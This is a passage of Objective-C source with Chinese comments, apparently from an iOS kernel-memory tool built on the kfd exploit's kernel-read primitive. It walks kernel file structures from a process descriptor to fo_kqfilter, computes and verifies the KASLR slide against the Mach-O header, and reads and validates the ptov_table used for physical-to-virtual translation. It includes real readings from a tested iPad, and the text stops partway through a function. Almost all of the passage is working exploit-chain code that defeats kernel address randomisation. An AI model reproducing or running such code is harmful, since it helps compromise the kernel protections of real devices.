 * 两条，第二条在符号取不到时**跳过而不是拒绝**：
 *   ① 硬：链接基址 + candidate 必须落在内核映像窗口 [VM_MIN_KERNEL_ADDRESS,
 *      +KM_SLIDE_IMAGE_SPAN) 内。零依赖、纯常量判据。
 *   ② 软：XPF 的链接期符号必须都压在链接基址之上 KM_SLIDE_IMAGE_SYMBOL_MAX_OFFSET
 *      以内 —— 它验证的是"这个基址确实压着这份映像的符号"。取不到符号就跳过：
 *      那两个符号在第⑥⑦步另有用途，不该因为它此刻缺席而把主流程的成功路径改窄
 *      （KernelSlide.h:46-49 写明：slide 单独有用，不该被后面的步骤拖累）。
 */
static bool slide_candidate_fits_image(const km_slide_run *run, uint64_t candidate,
                                       km_slide_text *t)
{
    const uint64_t kernelBase = run->linkBase.addr + candidate;

    if (kernelBase < KM_SLIDE_VM_MIN_KERNEL ||
        (kernelBase - KM_SLIDE_VM_MIN_KERNEL) >= KM_SLIDE_IMAGE_SPAN) {
        text_append(t, "  候选值越界：链接基址 %#llx + slide %#llx = %#llx，"
                       "不在内核映像窗口 [%#llx, %#llx) 内\n",
                    (unsigned long long)run->linkBase.addr,
                    (unsigned long long)candidate,
                    (unsigned long long)kernelBase,
                    (unsigned long long)KM_SLIDE_VM_MIN_KERNEL,
                    (unsigned long long)(KM_SLIDE_VM_MIN_KERNEL + KM_SLIDE_IMAGE_SPAN));
        return false;
    }

    /*
     * 刻意用 ObjC 字面量而不是 [NSString stringWithUTF8String:]：字面量是编译期常量
     * 对象，MRC 下也不产生 autorelease 对象 —— 本文件没有钉 -fobjc-arc（project.yml
     * 只给 libmemrw/xpf 钉了），而调用方那条串行队列上没有 runloop，
     * 在它上面漏出去的 autorelease 对象就是真泄漏。
     */
    static NSString *const imageSymbols[] = {
        @"kernelSymbol.ptov_table",
        @"kernelSymbol.gVirtBase",
    };
    const size_t symbolCount = sizeof(imageSymbols) / sizeof(imageSymbols[0]);

    for (size_t i = 0; i < symbolCount; i++) {
        const uint64_t vmaddr = km_xpf_resolve_symbol(imageSymbols[i]);
        if (vmaddr == 0) {
            text_append(t, "  （%s 取不到，第②条自洽检查跳过）\n", imageSymbols[i].UTF8String);
            continue;
        }
        if (vmaddr < run->linkBase.addr ||
            (vmaddr - run->linkBase.addr) >= KM_SLIDE_IMAGE_SYMBOL_MAX_OFFSET) {
            text_append(t, "  链接基址与 %s 不自洽：符号（链接期）=%#llx，"
                           "距基址 %#llx 超出 [0, %#llx)\n",
                        imageSymbols[i].UTF8String,
                        (unsigned long long)vmaddr,
                        (unsigned long long)(vmaddr >= run->linkBase.addr
                                             ? vmaddr - run->linkBase.addr
                                             : run->linkBase.addr - vmaddr),
                        (unsigned long long)KM_SLIDE_IMAGE_SYMBOL_MAX_OFFSET);
            return false;
        }
    }

    text_append(t, "  候选值独立约束通过：kernel_base=%#llx 落在映像窗口内%s\n",
                (unsigned long long)kernelBase,
                run->linkBase.fromXPF ? "" : "（注意：基址用的是兜底常量）");
    return true;
}

#pragma mark - 自检前落盘（先写文件，再发那次读）

/*
 * 这里正面撞上一次"必须"和一次"不许"，解法写在这两段之间：
 *
 *  · 必须：那次 kread 之前，文件里就得有内容（本文件头部 ② 的顺序纪律）。
 *    纯 fire-and-forget 的异步落盘做不到 —— 崩溃就发生在下游那次 kread 里，
 *    而后台线程那时可能还没被调度到，文件是空的。
 *
 *  · 不许：不能把文件 I/O 同步挂在读链上。MemoryProbe.swift:1242-1255 记着这条
 *    实测教训（观测工具不能长在被观测的路径上，尤其带 I/O 的）：那次同步落盘
 *    把整条读取链卡死，面板停在第一步再也不动 —— 每次要过 FileManager.urls →
 *    fileExists → FileHandle 开/寻址/写/关，其中任何一步都可能阻塞。
 *
 * 解法：把 I/O 全部搬进后台队列（同步阶段只做一次 malloc + memcpy），然后**有界等待**
 * 它写完（KM_SLIDE_DUMP_TIMEOUT_MS）。等待是必需的，不等待就等于放弃了"先写后读"；
 * 上限保证最坏情况是把这条读链按住 2 秒，而不是无限期 —— 与 MemoryProbe 那次
 * 卡死的区别就在这个上限上。
 *
 * 超时**不**阻断流程：落盘是观测手段，不许反过来变成门闸（否则"观测长在被观测的
 * 路径上"换个形式又回来了）。超时这件事本身写进诊断，事后能看出这次快照可能没落地。
 */
static pthread_mutex_t g_dumpLock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  g_dumpCond = PTHREAD_COND_INITIALIZER;
static bool            g_dumpDone = false;

/*
 * 真正落盘。**只在后台队列上执行** —— 这函数里每一步都可能阻塞。
 * 失败一律静默返回：调用链那头只关心"写完没写完"，不关心为什么没写完
 * （沙盒、磁盘、权限都不影响本次自检的正确性）。
 */
static void slide_write_diag_file(const char *text)
{
    /*
     * 本文件没有单独钉 -fobjc-arc（project.yml 只给 libmemrw/xpf 钉了），所以这里
     * 按 MRC 写：autorelease 对象不能漏在池外 —— 后台队列线程没有 runloop，
     * 没有池就等于每次调用漏一个 NSArray + NSString。
     */
    @autoreleasepool {
        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                                       NSUserDomainMask, YES);
        NSString *documents = dirs.count > 0 ? dirs.firstObject : nil;
        if (documents.length == 0) return;

        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s",
                 documents.fileSystemRepresentation, KM_SLIDE_DIAG_FILE_NAME);

        const int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) return;

        /*
         * 单次 write，不追加、不重试、短写就短写：这条路径上的任何重试都是拿
         * 读链的时间去换的，而它此刻正被有界等待按住。
         */
        const size_t len = strlen(text);
        const ssize_t written = write(fd, text, len);
        (void)written;
        close(fd);
    }
}

/// 异步写 + 有界等待。返回 true = 在窗口内写完；false = 超时或失败（都不算致命）。
static bool slide_dump_diag_and_wait(const char *text)
{
    if (!text) return false;

    /* 同步阶段只做内存拷贝：内容必须在堆上，异步块不能捕获栈上的缓冲。 */
    const size_t len = strlen(text);
    char *owned = malloc(len + 1);
    if (!owned) return false;
    memcpy(owned, text, len + 1);

    pthread_mutex_lock(&g_dumpLock);
    g_dumpDone = false;
    pthread_mutex_unlock(&g_dumpLock);

    /*
     * 用 global 队列而不是 dispatch_queue_create：本文件是 MRC 编译单元，
     * 自己 create 出来的队列对象还要管 release，而 global 队列不需要；
     * 这里也**不需要**串行 —— 全局状态只有 g_slideLock 下的这一次调用，天然串行。
     */
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        slide_write_diag_file(owned);
        free(owned);

        pthread_mutex_lock(&g_dumpLock);
        g_dumpDone = true;
        pthread_cond_signal(&g_dumpCond);
        pthread_mutex_unlock(&g_dumpLock);
    });

    struct timespec deadline;
    clock_gettime(CLOCK_REALTIME, &deadline);
    deadline.tv_sec += KM_SLIDE_DUMP_TIMEOUT_MS / 1000;
    deadline.tv_nsec += (long)(KM_SLIDE_DUMP_TIMEOUT_MS % 1000) * 1000000L;
    if (deadline.tv_nsec >= 1000000000L) {
        deadline.tv_sec += 1;
        deadline.tv_nsec -= 1000000000L;
    }

    pthread_mutex_lock(&g_dumpLock);
    while (!g_dumpDone) {
        if (pthread_cond_timedwait(&g_dumpCond, &g_dumpLock, &deadline) == ETIMEDOUT) break;
    }
    const bool settled = g_dumpDone;
    pthread_mutex_unlock(&g_dumpLock);
    return settled;
}

/*
 * 组装并落盘"崩之前那一刻"的全部数值。它是自检那次 kread 的**前一步**，
 * 而且必须真的写完（见 slide_dump_diag_and_wait）。
 *
 * 头部键名是固定的：它们与面板诊断文本里的那几行同名，两处并排一看就知道
 * 哪些数在这次事件里是对的、哪些是错的。
 */
static bool slide_dump_before_kread(const km_slide_run *run, uint64_t candidate,
                                    const km_slide_text *t)
{
    @autoreleasepool {
        NSString *kernelcache = km_xpf_kernelcache_path();

        char head[1024];
        snprintf(head, sizeof(head),
                 "Aether KernelSlide diag — 自检前落盘"
                 "（写下这一刻，之后才决定要不要发出那次 kread）\n"
                 "candidate=%#llx\n"
                 "link_const=%#llx\n"
                 "link_xpf=%#llx\n"
                 "link_used=%#llx  from=%s\n"
                 "kernel_base_pending=%#llx\n"
                 "fo_kqfilter_raw=%#llx\n"
                 "fo_kqfilter_unsign=%#llx\n"
                 "linked_vn_kqfilter=%#llx\n"
                 "t1sz_boot=%llu\n"
                 "current_proc=%#llx\n"
                 "fd_ofiles_offset=%#llx\n"
                 "kernelcache=%s\n"
                 "=== 诊断正文（发读之前的快照）===\n",
                 (unsigned long long)candidate,
                 (unsigned long long)KM_SLIDE_LINK_ADDR_FALLBACK,
                 (unsigned long long)run->linkBase.xpfValue,
                 (unsigned long long)run->linkBase.addr,
                 run->linkBase.fromXPF ? "xpf" : "const",
                 (unsigned long long)(run->linkBase.addr + candidate),
                 (unsigned long long)run->foKqfilterRaw,
                 (unsigned long long)run->foKqfilter,
                 (unsigned long long)run->linkedVnKqfilter,
                 (unsigned long long)run->t1sz,
                 (unsigned long long)run->proc,
                 (unsigned long long)run->fdOfilesOffset,
                 kernelcache ? kernelcache.fileSystemRepresentation : "(XPF 未就绪)");

        /*
         * 头部 + 诊断正文一次拼完再写：诊断正文此刻已经装好 ①②③④ 各步的读数，
         * 分两次 write 只会多一个"只写了一半"的中间态。
         */
        const size_t headLen = strlen(head);
        const size_t bodyLen = t ? strlen(t->buf) : 0;
        char *text = malloc(headLen + bodyLen + 1);
        if (!text) return false;

        memcpy(text, head, headLen);
        if (bodyLen) memcpy(text + headLen, t->buf, bodyLen);
        text[headLen + bodyLen] = '\0';

        const bool settled = slide_dump_diag_and_wait(text);
        free(text);
        return settled;
    }
}

#pragma mark - 步骤③④⑤：fd → fo_kqfilter → slide → 自检

/*
 * 从「本进程的一条 vnode fd」反查到 fo_kqfilter，逐行对照 perf.h:97-106：
 *
 *     fd_ofiles = kget(proc + proc__p_fd__fd_ofiles)
 *     fileproc  = kread(UNSIGN(fd_ofiles) + fd * sizeof(u64))
 *     fp_glob   = kread(fileproc + offsetof(struct fileproc, fp_glob))
 *     fg_ops    = kread(UNSIGN(fp_glob) + offsetof(struct fileglob, fg_ops))
 *     fo_kqfilter = kread(UNSIGN(fg_ops) + offsetof(struct fileops, fo_kqfilter))
 *
 * 关于第一步：**为什么一次偏移读出来的就是 ofiles 数组基址**（这里容易被误读成
 * "少解了一次引用"）。键名 proc__p_fd__fd_ofiles 说的是"这条路径的终点"，而它的值
 * （目标机 Darwin 22.4.0 条目里是 0xf8）实际上就是 `offsetof(struct proc, p_fd)` ——
 * 之所以一次就够，是因为 xnu 的 `struct filedesc` 把 `fd_ofiles` 放在结构体第一个
 * 字段（偏移 0），于是 "p_fd 指针的解引用" 与 "fd_ofiles 在 filedesc 内的偏移"
 * 合成了同一个数。上游 kfd 也是这么用的（perf.h:97-98 把那一次读的结果直接当数组基址）。
 * 万一哪天这条等价关系不成立，症状是读出的 fileproc 过不了形态检查 → 立刻失败退出。
 *
 * 每一步都过一次形态检查（slide_read_kernel_ptr 内部两道），任何一步不过就立刻
 * 返回 false，**绝不拿它去读下一次** —— 这是本文件的血债条款：kread 会让内核
 * 按内核语义解引用目标地址，读一个没映射的地址就是内核态 data abort。
 * 检查通过只说明"像内核地址"，不说明"已映射"；链条能走下去的理由是
 * 下一个地址来自内核自己写下的数据（fileproc 来自 ofiles 数组、fp_glob 来自
 * fileproc 字段……），而不是我们算出来的。
 *
 * 整条链最终由「④ 的差值 + ⑤ 的 Mach-O 头自检」交叉验证：链条上任一步读错，
 * 得到的 fo_kqfilter 几乎不可能同时满足"与 XPF 的链接期值相差一个 16 KB 对齐的
 * 常数"和"该常数加在链接基址上正对着 Mach-O 头"。
 */
static bool slide_resolve_fo_kqfilter(km_slide_run *run, km_slide_text *t)
{
    if (run->fd < 0 || run->fd >= KM_SLIDE_MAX_FD) {
        text_append(t, "  fd=%d 不在可用范围（0..%d）\n", run->fd, KM_SLIDE_MAX_FD - 1);
        return slide_refuse(run, t, "③ fd→fo_kqfilter", "fd 索引不合理");
    }

    const uint64_t fdOfiles = slide_read_kernel_ptr(run->proc + run->fdOfilesOffset,
                                                   "fd_ofiles", run->t1sz, t, NULL);
    if (!fdOfiles) return slide_refuse(run, t, "③ fd→fo_kqfilter", "读 fd_ofiles 失败");

    const uint64_t fileprocAddr = fdOfiles + (uint64_t)run->fd * sizeof(uint64_t);
    const uint64_t fileproc = slide_read_kernel_ptr(fileprocAddr, "fileproc", run->t1sz, t, NULL);
    if (!fileproc) return slide_refuse(run, t, "③ fd→fo_kqfilter", "读 fileproc 失败");

    const uint64_t fpGlob = slide_read_kernel_ptr(fileproc + KM_OFF_FILEPROC_FP_GLOB,
                                                 "fp_glob", run->t1sz, t, NULL);
    if (!fpGlob) return slide_refuse(run, t, "③ fd→fo_kqfilter", "读 fp_glob 失败");

    const uint64_t fgOps = slide_read_kernel_ptr(fpGlob + KM_OFF_FILEGLOB_FG_OPS,
                                                "fg_ops", run->t1sz, t, NULL);
    if (!fgOps) return slide_refuse(run, t, "③ fd→fo_kqfilter", "读 fg_ops 失败");

    /* 链上唯一一步要留原始读数（rawOut），理由见 slide_read_kernel_ptr 的注释。 */
    const uint64_t foKqfilter = slide_read_kernel_ptr(fgOps + KM_OFF_FILEOPS_FO_KQFILTER,
                                                     "fo_kqfilter", run->t1sz, t,
                                                     &run->foKqfilterRaw);
    if (!foKqfilter) return slide_refuse(run, t, "③ fd→fo_kqfilter", "读 fo_kqfilter 失败");

    run->foKqfilter = foKqfilter;
    text_append(t, "③ 链：fd_ofiles=%#llx fileproc=%#llx fp_glob=%#llx fg_ops=%#llx "
                   "fo_kqfilter=%#llx（原始读数 %#llx）\n",
                (unsigned long long)fdOfiles, (unsigned long long)fileproc,
                (unsigned long long)fpGlob, (unsigned long long)fgOps,
                (unsigned long long)foKqfilter, (unsigned long long)run->foKqfilterRaw);
    return true;
}

/*
 * slide 自检 —— 判据与 perf.h:112-118 相同，只换掉了拼接用的那个基址：
 *     kernel_base = 链接基址 + slide           （上游写的是 ARM64_LINK_ADDR + slide）
 *     kernel_base 处的两个 32 位字必须是 MH_MAGIC_64 与 cputype(=arm64|ABI64)
 *
 * 为什么这条能证明 slide 对：slide 是「运行时 vn_kqfilter − 链接期 vn_kqfilter」，
 * 两边任一处错，得到的都是一个随机数；随机 slide 加在链接基址上，恰好落在一段以
 * 这两个字开头（且相邻两个字都对）的内核数据上的概率是 2^-64 量级。
 *
 * 但这条判据有它自己**挡不住**的一类错：基址本身错。上游那一行抄的是一个构建期
 * 派生的常量（static_info.h:12），它在本类机型上偏了整 2 TB —— 那时无论 candidate
 * 对不对，待读地址都落在未映射区，而 kread 是让内核去解引用它：内核态 data abort、
 * 整机重启（设备上实测的彩屏）。所以本函数里读之前有两道额外纪律：
 *   ① 先把此刻的全部数值落盘（那次读若出事，内存里的诊断会随重启一起没）；
 *   ② 再过 slide_candidate_fits_image 的纯算术约束：不通过就一次读都不发
 *      （基址取错域时它直接失败，而那正是最该留下现场的一类）。
 *
 * 顺带把一处容易读错的细节写下来：0x0100000c 是 **cputype**（CPU_TYPE_ARM64 |
 * CPU_ARCH_ABI64），不是 arm64e 的标识 —— arm64e 体现在紧随其后的 cpusubtype
 * 里（CPU_SUBTYPE_ARM64E）。所以这条判据对 arm64 与 arm64e 是同一套。
 *
 * 失败时把**算出来的 slide、kernel_base、实际读到的两个字**都写进诊断 ——
 * 那是唯一能反推"是 slide 错还是读错"的证据（而基址来源会写在 ④ 与自检之间的
 * link_const / link_xpf 两行里）。
 */
static bool slide_verify_kernel_base(km_slide_run *run, uint64_t candidate, km_slide_text *t)
{
    run->kernelBase = run->linkBase.addr + candidate;

    text_append(t, "⑤ 待读地址=%#llx（链接基址 %#llx + slide %#llx）\n",
                (unsigned long long)run->kernelBase,
                (unsigned long long)run->linkBase.addr,
                (unsigned long long)candidate);

    /*
     * 顺序纪律（本文件头部 ②）：**先把这一刻的全部数值落盘，再决定要不要读**。
     * 这个读若地址不对，代价是内核态 data abort（整机重启），而内存里的诊断会跟着
     * 一起消失 —— 上一次彩屏丢的就是这一刻的全部数值。
     *
     * 落盘刻意放在下面那道纯算术约束**之前**：约束不通过时同样留下现场。那种情形
     * （链接基址取错域）恰恰是最需要事后能读到数值的一种，而它一次 kread 都不发 ——
     * 换句话说，这一份文件是"我们会去读什么"的唯一记录，无论后来读没读。
     *
     * 落盘是有界等待，不是同步挂在读链上的 I/O，理由见 slide_dump_diag_and_wait()。
     */
    run->dumpSettled = slide_dump_before_kread(run, candidate, t);
    text_append(t, "  自检前落盘：%s（Documents/%s）\n",
                run->dumpSettled ? "已写完" : "超时或失败（不阻断本次自检）",
                KM_SLIDE_DIAG_FILE_NAME);

    /*
     * 纯算术约束再看要不要读：不通过时这一轮一次 kread 都不发。
     */
    if (!slide_candidate_fits_image(run, candidate, t)) {
        return slide_refuse(run, t, "⑤ 自检",
                            "候选值与链接基址拼出的地址不在内核映像窗口内（未发出 kread）");
    }

    uint32_t head[2] = { 0, 0 };
    if (!slide_read_bulk(run->kernelBase, head, sizeof(head))) {
        text_append(t, "  kernel_base=%#llx 读不到（形态检查未过或 kread 失败）\n",
                    (unsigned long long)run->kernelBase);
        return slide_refuse(run, t, "⑤ 自检", "读不到 kernel_base 处的头部");
    }

    if (head[0] != KM_SLIDE_MH_MAGIC || head[1] != KM_SLIDE_MH_CPUTYPE) {
        text_append(t, "  自检不通过：slide=%#llx kernel_base=%#llx "
                       "头部实际读到 %#x / %#x（期望 %#x / %#x）\n",
                    (unsigned long long)candidate,
                    (unsigned long long)run->kernelBase,
                    head[0], head[1], KM_SLIDE_MH_MAGIC, KM_SLIDE_MH_CPUTYPE);
        return slide_refuse(run, t, "⑤ 自检", "kernel_base 头部不是 MH_MAGIC_64/arm64");
    }

    /* 这里打印 candidate 而不是 run->slide：run->slide 要到本函数返回之后才赋值，
     * 用它会把这行诊断打成 slide=0（值本身没错，显示错的诊断比没有更差）。 */
    text_append(t, "⑤ 自检通过：slide=%#llx kernel_base=%#llx 头部=%#x/%#x\n",
                (unsigned long long)candidate,
                (unsigned long long)run->kernelBase,
                head[0], head[1]);
    return true;
}

static bool slide_run_find_slide(km_slide_run *run, km_slide_text *t)
{
    bool ok = slide_resolve_fo_kqfilter(run, t);

    /* fd 用完了：立刻关掉，后面几步不再需要文件本身（读的是内核里的 fileops 表）。 */
    if (run->fd >= 0) {
        close(run->fd);
        run->fd = -1;
    }
    if (!ok) return false;

    const uint64_t linkedVnKqfilter = km_xpf_resolve_symbol(@"kernelSymbol.vn_kqfilter");
    if (linkedVnKqfilter == 0) {
        NSString *xpfError = km_xpf_last_error();
        text_append(t, "④ XPF 取不到 kernelSymbol.vn_kqfilter：%s\n",
                    xpfError ? xpfError.UTF8String : "(没有错误文本)");
        return slide_refuse(run, t, "④ 求 slide", "XPF 没解析出 kernelSymbol.vn_kqfilter");
    }

    /*
     * 差值的形态检查（16 KB 页对齐 + 上界）。它们只是**提前**挡掉明显的错值，
     * 采信条件仍然只有下面的自检 —— 与 KernelMemory.m 那条教训同型：
     * 一个"看似合法的错值"比 0 更危险，所以算出来的东西在通过独立验证之前，
     * 一个字都不写进任何会被下游读到的位置（run->slide 只在自检通过后才赋值，
     * 全流程的发布点只有一处，见 slide_run_locked）。
     */
    if (run->foKqfilter < linkedVnKqfilter) {
        text_append(t, "④ 运行时 vn_kqfilter=%#llx 小于链接期值 %#llx，差值下溢\n",
                    (unsigned long long)run->foKqfilter,
                    (unsigned long long)linkedVnKqfilter);
        return slide_refuse(run, t, "④ 求 slide", "运行时值小于链接期值");
    }

    const uint64_t candidate = run->foKqfilter - linkedVnKqfilter;

    if (candidate >= KM_SLIDE_MAX_VALUE || (candidate & 0x3fffULL) != 0) {
        text_append(t, "④ slide=%#llx 形态不合法（上界 %#llx，且需 16 KB 对齐）\n",
                    (unsigned long long)candidate,
                    (unsigned long long)KM_SLIDE_MAX_VALUE);
        return slide_refuse(run, t, "④ 求 slide", "差值超出合理范围或未页对齐");
    }

    text_append(t, "④ vn_kqfilter：运行时=%#llx 链接期(XPF)=%#llx → slide=%#llx（待自检）\n",
                (unsigned long long)run->foKqfilter,
                (unsigned long long)linkedVnKqfilter,
                (unsigned long long)candidate);
    run->linkedVnKqfilter = linkedVnKqfilter;

    /*
     * 链接基址：XPF 现取优先，取不到才退回兜底常量（两个值都会写进诊断，
     * 见 slide_link_base）。取在这里而不是进函数时，是为了让诊断的顺序就是
     * 数据流的顺序：④ 先有差值，⑤ 才有待读地址可拼。
     */
    run->linkBase = slide_link_base(t);

    if (!slide_verify_kernel_base(run, candidate, t)) return false;

    run->slide = candidate; /* 自检通过才采信 */
    run->slideVerified = true;
    return true;
}

#pragma mark - 步骤⑥⑦：换算表与抽样

/*
 * ── ptov_table 的「可不可信」判据（纯算术、零 kread）───────────────────────
 *
 * 判据不是"每一项的形状"，而是"这张表与三个基准之间的代数关系"。为什么必须这样：
 * 这张表的**地址**来自 XPF 的 kernelSymbol.ptov_table，而那个 finder 的链是
 * `xpf_find_ptov_table` → 先 resolve `kernelSymbol.phystokv` → 再在 phystokv 的
 * 反汇编里找**第 2 个 LDR**。而 phystokv 内部同时有加载 ptov_table / gPhysBase /
 * gVirtBase 的 ADRP+LDR —— 抓错其中任何一条，返回的就是**邻近某个标量全局**的地址；
 * 把它当表头逐项解引用，读到的 pa 是那个全局的**值**（看着像物理地址）、va 是紧邻
 * 内存里的另一个全局、len 又是别的：**每一项都形态合理，整张表却是假的**。
 * 形状判据对这类错值天然是盲的（KernelMemory.m 那条"看似合法的错值比 0 更危险"
 * 说的是同一件事）。
 *
 * 两条判据（都通过才算可信）：
 *   ① 偏移恒定：每个非哨兵项满足 `va - pa == gVirtBase - gPhysBase`。
 *      为什么是"偏移恒定"而不是逐段比边界：物理内存可以分成多段（多段正是这张表
 *      存在的理由），而 physmap 对所有段的偏移相同 —— 这一条与 perf.h:241 的
 *      `return pa - ptov[i].pa + ptov[i].va` 是同一件事的另一种写法。
 *   ② 值域：`va ∈ [gVirtBase, gVirtBase + gPhysSize)`。
 *
 * 真机实测（iPad14,3 / iPadOS 16.4.1，本轮诊断的原始读数）—— 两条都过不了：
 *     gVirtBase=0xfffffe001e57c000  gPhysBase=0x80257c000
 *     delta = gVirtBase - gPhysBase = 0xfffffdf81c000000
 *     ptov[0] pa=0x80af20000 → 按 delta 期望 va = 0xfffffe0026f20000
 *             实测 va = 0xfffffdf03cf24000，va - pa = 0xfffffde832004000   ✗①
 *             且 0xfffffdf03cf24000 < gVirtBase（比 0xfffffe 窗口低约 32 GiB）  ✗②
 * 两条都不过 ⇒ 这张表不是描述本机映射的，查表必须停用：perf.h 那个循环会拿一项假的
 * (pa, va) 把一个段外地址算成一个"形态合法"的内核地址，下钻即 data abort。
 *
 * 与此相对，三个基准本身是可信的：gPhysBase 页对齐、形如"32 GiB 之上偏移 38 MB"
 * 这一 Apple 芯片 DRAM 起点、gVirtBase 落在合法的 0xfffffe 窗口，且两者互相对得上
 * （gVirtBase - gPhysBase = 0xfffffdf81c000000）。而兜底公式
 * `pa - gPhysBase + gVirtBase` 只用这三个值 —— **表是"可以不用"的东西**，所以判据
 * 不过的后果只能是"停用查表、改用兜底"，不该是"整条 PA→KVA 失败"。
 */
static bool slide_fallback_usable(uint64_t virtBase, uint64_t physBase, uint64_t physSize)
{
    /*
     * 兜底公式的前置条件，逐条都对应公式里的一个位置：
     *   · virtBase 必须在内核地址域里（km_slide_kernel_ptr，KernelSlide.m:321-326）——
     *     它是公式的加数，也是下游 km_read64 的输入；
     *   · physBase / physSize 必须在物理地址空间（< 2^48）且非 0 —— physBase 是减数，
     *     physSize 是范围检查的除数（它为 0 时 `(pa - physBase) >= 0` 恒真，
     *     公式对任何 pa 都返回 0，等于 PA→KVA 全灭）。
     * 刻意**不含** ptov_table：兜底公式与那张表无关，这正是本轮改动的立足点。
     */
    if (!km_slide_kernel_ptr(virtBase)) return false;
    if (physBase == 0 || physBase >= (1ULL << 48)) return false;
    if (physSize == 0 || physSize >= (1ULL << 48)) return false;
    return true;
}

/*
 * 判据①：偏移恒定。返回 true = 每个非哨兵项都满足 va - pa == gVirtBase - gPhysBase。
 * 不过时打印**第一个**不过的项（下标 + 实测 + 期望）—— 诊断要能直接说出"为什么不可信"，
 * 而不是只丢一句"表不合法"。
 */
static bool slide_ptov_delta_invariant(const km_slide_run *run, km_slide_text *t)
{
    if (!slide_fallback_usable(run->virtBase, run->physBase, run->physSize)) {
        text_append(t, "  [可信判据① 偏移恒定] 无法评估：三个基准未同时可用（见上面各自的读数行）\n");
        return false;
    }
    if (run->ptov[0].len == 0) {
        text_append(t, "  [可信判据① 偏移恒定] 无法评估：表首项 len=0，按 perf.h:240 这是一张空表\n");
        return false;
    }

    const uint64_t delta = run->virtBase - run->physBase;
    uint64_t items = 0;
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        if (run->ptov[i].len == 0) break; /* 表结束（perf.h:240） */
        items++;

        const uint64_t pa = run->ptov[i].pa;
        const uint64_t va = run->ptov[i].va;
        if (va < pa) {
            text_append(t, "  [可信判据① 偏移恒定] 不过：ptov[%llu] va=%#llx < pa=%#llx（偏移为负，不可能）\n",
                        (unsigned long long)i,
                        (unsigned long long)va, (unsigned long long)pa);
            return false;
        }
        if ((va - pa) != delta) {
            text_append(t, "  [可信判据① 偏移恒定] 不过：ptov[%llu] pa=%#llx va=%#llx → va-pa=%#llx；"
                           "期望 %#llx（= gVirtBase - gPhysBase）\n",
                        (unsigned long long)i,
                        (unsigned long long)pa, (unsigned long long)va,
                        (unsigned long long)(va - pa), (unsigned long long)delta);
            return false;
        }
    }

    text_append(t, "  [可信判据① 偏移恒定] 通过：%llu 项全部满足 va-pa == %#llx\n",
                (unsigned long long)items, (unsigned long long)delta);
    return true;
}

/*
 * 判据②：va 值域。返回 true = 每个非哨兵项的 va 都落在 physmap 的虚拟覆盖范围
 * [gVirtBase, gVirtBase + gPhysSize) 内。
 *
 * 上界用 gPhysSize 的理由与上游把 `pa - gPhysBase < gPhysSize` 写成 assert 是同一个：
 * 合法的段是 DRAM 的子集，而 DRAM 全在 [gPhysBase, gPhysBase + gPhysSize) 里。
 */
static bool slide_ptov_va_in_range(const km_slide_run *run, km_slide_text *t)
{
    if (!slide_fallback_usable(run->virtBase, run->physBase, run->physSize)) {
        text_append(t, "  [可信判据② va 值域] 无法评估：三个基准未同时可用（见上面各自的读数行）\n");
        return false;
    }
    if (run->ptov[0].len == 0) {
        text_append(t, "  [可信判据② va 值域] 无法评估：表首项 len=0，按 perf.h:240 这是一张空表\n");
        return false;
    }

    /* physSize < 2^48 而 virtBase 在高位全 1 的内核域，两者相加不会回绕。 */
    const uint64_t low = run->virtBase;
    uint64_t items = 0;
    for (uint64_t i = 0; i < KM_SLIDE_PTOV_COUNT; i++) {
        if (run->ptov[i].len == 0) break;

        items++;
        const uint64_t va = run->ptov[i].va;
        if (va < low || (va - low) >= run->physSize) {
            text_append(t, "  [可信判据② va 值域] 不过：ptov[%llu] va=%#llx 不在 [%#llx, %#llx) 内（%s）\n",
                        (unsigned long long)i,
                        (unsigned long long)va,
                        (unsigned long long)low,
                        (unsigned long long)(low + run->physSize),
                        (va < low) ? "低于下界" : "越过上界");
            return false;
        }
    }

    text_append(t, "  [可信判据② va 值域] 通过：%llu 项全部落在 [%#llx, %#llx) 内\n",
                (unsigned long long)items,
                (unsigned long long)low, (unsigned long long)(low + run->physSize));
    return true;
}

/*
 * 前向声明（必须在文件作用域，不能放进函数体内）：表的判据结论之后也要把独立锚点的
 * 校验结论写进诊断，而那个函数的定义在本文件靠后的位置。
 */
static void slide_check_ptov_against_anchor(const km_slide_run *run, km_slide_text *t);

/*
 * 读回 ptov_table（8 项定长表），逐行对照 perf.h:150-151，然后判定它**可不可信**。
 *
 * 返回类型是 void，这是本轮改动的核心：**这张表读不到、或不可信，都不再是失败出口**。
 * 以前这里是"任何一项不合法就整表拒绝、整条流水线失败"，真机后果是：表读到假数据
 * ⇒ 整条 resolve 失败 ⇒ km_phystokv_ready() 恒 false ⇒ 依赖 PA→KVA 的建表路径
 * 一步都走不了 —— 而**真正在用的兜底公式根本不需要这张表**。
 * 现在两种情形都只记进 run->ptovTrusted 与诊断（哪一条判据不过、期望值与实测值）。
 *
 * 三道判据全过才置 run->ptovTrusted：
 *   · 形态（③，原有）：每一项 va 是内核地址、pa 与 len 落在物理地址空间且 len 非 0，
 *     至少 1 项有效。为什么这一条必须留着：半张表比没有表更危险 —— 缺的那一项会让
 *     查表把段内地址算成段外（KernelMemory.m 记着的 bug_type 210 就是这一路）；
 *   · ① 偏移恒定、② va 值域：对三个基准的代数关系，见本函数上方那段注释。
 * 表按「len == 0 即结束」解释（perf.h:240 的循环条件原样继承）。
 */
static void slide_read_ptov_table(uint64_t slide, km_slide_ptov_entry *out,
                                  km_slide_run *run, km_slide_text *t)
{
    run->ptovTrusted = false;

    const uint64_t symbol = km_xpf_resolve_symbol(@"kernelSymbol.ptov_table");
    if (symbol == 0) {
        text_append(t, "  XPF 取不到 kernelSymbol.ptov_table（它的 finder 是已知会指错的那一条链：\n");
        text_append(t, "  xpf_find_ptov_table 先 resolve phystokv，再从它的反汇编里找第 2 个 LDR）\n");
        text_append(t, "  ⇒ ptov_table 不可信：符号都取不到；查表路径停用，PA→KVA 走兜底公式\n");
        return;
    }

    const uint64_t tableAddr = symbol + slide;
    km_slide_ptov_entry table[KM_SLIDE_PTOV_COUNT] = {};
    const size_t tableSize = sizeof(table);

    if (!slide_read_bulk(tableAddr, table, tableSize)) {
        text_append(t, "  ptov_table=%#llx（符号 %#llx + slide）读失败\n",
                    (unsigned long long)tableAddr, (unsigned long long)symbol);
